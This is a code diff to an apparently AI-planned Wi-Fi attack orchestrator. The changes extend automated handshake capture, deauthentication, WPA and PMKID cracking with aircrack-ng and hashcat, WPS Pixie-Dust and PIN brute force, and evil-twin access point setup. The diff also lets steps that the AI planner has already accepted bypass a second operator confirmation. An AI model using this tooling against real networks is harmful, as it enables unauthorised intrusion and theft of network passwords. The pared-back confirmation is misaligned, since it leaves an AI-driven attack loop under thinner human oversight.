+    def _step_confirm(self, step: Dict[str, Any], prompt: str) -> bool:
+        """Second-line confirm inside ``_execute_step``.
+
+        When the AI walk already ACCEPTed the step (``pre_accepted``),
+        skip the nested prompt so the operator is not asked twice for
+        the same action (designed: one gate per step).
+        """
+        if step.get("pre_accepted"):
+            return True
+        return bool(self.confirm_fn(prompt))
+
     def _execute_step(self, step: Dict[str, Any], seed: Dict[str, Any]) -> Any:
         """Run one real step. Returns a short status string OR, for the
         crack-family steps, a structured dict carrying a recovered
@@ -4584,16 +5015,67 @@ class AutonomousOrchestrator:
         action = step.get("action")
         try:
             if action == "airodump":
-                from core.scanners.wifi_scanner import WiFiScanner
-                ws = WiFiScanner(interface=step.get("iface"))
-                ws.initialize()
-                r = ws.scan(interface=step.get("iface"), timeout=10)
-                return f"scan rc={len(r.get('networks', []))} nets, err={r.get('error') or 'none'}"
+                # Prefer a real bounded capture (-w) so later crack/pmkid
+                # steps have a cap_file. Fall back to a short scan when
+                # airodump-ng is missing or the capture fails.
+                iface = step.get("iface") or seed.get("interface") or self.interface
+                bssid = step.get("bssid") or seed.get("bssid") or ""
+                ch = step.get("channel") or seed.get("channel") or ""
+                write_base = (
+                    step.get("write")
+                    or f"/tmp/kfiosa-{str(bssid).replace(':', '') or 'scan'}"
+                )
+                cap_guess = f"{write_base}-01.cap"
+                try:
+                    from core.mcp.tools import _run_airodump
+                    res = _run_airodump({
+                        "interface": iface,
+                        "channel": ch,
+                        "bssid": bssid or None,
+                        "write": write_base,
+                        "output_format": "pcap",
+                    }, timeout=int(step.get("timeout") or 25))
+                    # airodump appends -01.cap; also accept existing recon pcap
+                    from pathlib import Path as _P
+                    found = None
+                    for cand in (cap_guess, f"{write_base}.cap",
+                                 seed.get("cap_file"), seed.get("pcap")):
+                        if cand and _P(str(cand)).is_file():
+                            found = str(cand)
+                            break
+                    if found:
+                        seed["cap_file"] = found
+                        seed["pcap"] = found
+                    ok = bool(res.get("ok")) or bool(found)
+                    return {
+                        "ok": ok,
+                        "method": "airodump-ng",
+                        "cap_file": found,
+                        "write": write_base,
+                        "stdout_tail": (res.get("stdout") or "")[-200:],
+                        "error": None if ok else (res.get("error") or "no cap written"),
+                    }
+                except Exception as e:  # noqa: BLE001
+                    # Legacy scan fallback (discovery only — no handshake).
+                    try:
+                        from core.scanners.wifi_scanner import WiFiScanner
+                        ws = WiFiScanner(interface=iface)
+                        ws.initialize()
+                        r = ws.scan(interface=iface, timeout=10)
+                        return (
+                            f"scan rc={len(r.get('networks', []))} nets, "
+                            f"err={r.get('error') or 'none'} "
+                            f"(capture fallback: {e})"
+                        )
+                    except Exception as e2:  # noqa: BLE001
+                        return {"ok": False, "method": "airodump-ng",
+                                "error": f"airodump: {e}; scan: {e2}"}
             if action == "deauth":
                 return self._deauth(
-                    step.get("iface") or self.interface,
-                    step.get("bssid"),
-                    seed.get("channel"),
+                    step.get("iface") or step.get("args", {}).get("interface")
+                    or self.interface,
+                    step.get("bssid") or (step.get("args") or {}).get("bssid"),
+                    step.get("channel") or seed.get("channel"),
                     seed,
                 )
             if action == "crack":
@@ -4601,15 +5083,17 @@ class AutonomousOrchestrator:
                 # handshake. ``pcap``/``wordlist``/``bssid`` come from the
                 # planner (AI path) or the static ladder. Returns a dict
                 # with ``creds`` so _record_access flips access.
-                pcap = step.get("cap_file") or step.get("pcap") or seed.get("cap_file")
+                pcap = self._resolve_cap_file(step, seed)
                 bssid = step.get("bssid") or seed.get("bssid")
                 wep = bool(step.get("wep") or seed.get("wep"))
                 wordlist = self._resolve_wordlist(
-                    seed, report=None, prefer=step.get("wordlist"))
+                    seed, report=None, prefer=step.get("wordlist")
+                    or (step.get("args") or {}).get("wordlist"))
                 if not pcap:
                     return {"ok": False, "method": "aircrack-ng",
                             "error": "crack: no cap_file (planner-supplied)"}
-                if not self.confirm_fn(
+                if not self._step_confirm(
+                        step,
                         f"Run aircrack-ng {'WEP' if wep else 'WPA'} crack on {pcap}?"):
                     return {"ok": False, "method": "aircrack-ng",
                             "error": "crack: blocked by confirm_fn"}
@@ -4619,14 +5103,26 @@ class AutonomousOrchestrator:
             if action == "pmkid":
                 # PMKID attack: clientless hashcat -m 22000 on a captured
                 # pcap (converted to hc22000). Propagates recovered PSK.
-                pcap = step.get("pcap") or step.get("cap_file") or seed.get("cap_file")
+                pcap = self._resolve_cap_file(step, seed)
                 wordlist = self._resolve_wordlist(
-                    seed, report=None, prefer=step.get("wordlist"))
+                    seed, report=None, prefer=step.get("wordlist")
+                    or (step.get("args") or {}).get("wordlist"))
                 bssid = step.get("bssid") or seed.get("bssid") or ""
+                iface = (step.get("iface") or step.get("interface")
+                         or (step.get("args") or {}).get("interface")
+                         or seed.get("interface") or self.interface)
+                ch = (step.get("channel") or (step.get("args") or {}).get("channel")
+                      or seed.get("channel") or "")
+                # If no pcap yet, try a short hcxdumptool PMKID capture.
+                if not pcap and bssid and iface:
+                    pcap = self._capture_pmkid_pcap(
+                        iface=iface, bssid=bssid, channel=ch, seed=seed)
                 if not pcap:
                     return {"ok": False, "method": "hashcat",
                             "error": "pmkid: no pcap/cap_file (planner-supplied)"}
-                if not self.confirm_fn(f"Run PMKID hashcat -m 22000 on {pcap} (bssid={bssid})?"):
+                if not self._step_confirm(
+                        step,
+                        f"Run PMKID hashcat -m 22000 on {pcap} (bssid={bssid})?"):
                     return {"ok": False, "method": "hashcat",
                             "error": "pmkid: blocked by confirm_fn"}
                 hash_file = self._pcap_to_hc22000(pcap)
@@ -4643,7 +5139,9 @@ class AutonomousOrchestrator:
                 if not bssid:
                     return {"ok": False, "method": "wps_pixie",
                             "error": "wps_pixie: requires bssid (planner-supplied)"}
-                if not self.confirm_fn(f"Run WPS Pixie-Dust on {bssid} via {iface}?"):
+                if not self._step_confirm(
+                        step,
+                        f"Run WPS Pixie-Dust on {bssid} via {iface}?"):
                     return {"ok": False, "method": "wps_pixie",
                             "error": "wps_pixie: blocked by confirm_fn"}
                 import subprocess
@@ -4674,7 +5172,9 @@ class AutonomousOrchestrator:
                 if not bssid:
                     return {"ok": False, "method": "wps_online",
                             "error": "wps_online: requires bssid (planner-supplied)"}
-                if not self.confirm_fn(f"Run WPS PIN brute (bully) on {bssid} via {iface}?"):
+                if not self._step_confirm(
+                        step,
+                        f"Run WPS PIN brute (bully) on {bssid} via {iface}?"):
                     return {"ok": False, "method": "wps_online",
                             "error": "wps_online: blocked by confirm_fn"}
                 import subprocess
@@ -4735,10 +5235,17 @@ class AutonomousOrchestrator:
                         f"echo 'evil-twin {ssid} running on {iface} ch{ch}'; "
                         f"read -p 'press enter to stop...'",
                     ]
-                    self.external_terminal.launch(
-                        cmd, log_path, settings=self.settings,
-                        title=f"evil-twin {ssid}",
-                    )
+                    # ExternalTerminalBackend.launch(cmd, log_path, title=...)
+                    # — settings are bound on the backend at construction;
+                    # FakeTerminalBackend accepts settings= as optional.
+                    # Never pass settings= here (TypeError on the real backend).
+                    try:
+                        self.external_terminal.launch(
+                            cmd, log_path, title=f"evil-twin {ssid}",
+                        )
+                    except TypeError:
+                        # Older duck-types: launch(cmd, log_path) only.
+                        self.external_terminal.launch(cmd, log_path)
                     return f"evil_twin_capture: spawned in external terminal (log={log_path})"
                 return (f"evil_twin_capture: configs written under {tmp}; "
                         f"run: hostapd {conf} & dnsmasq -C {dconf} -d")
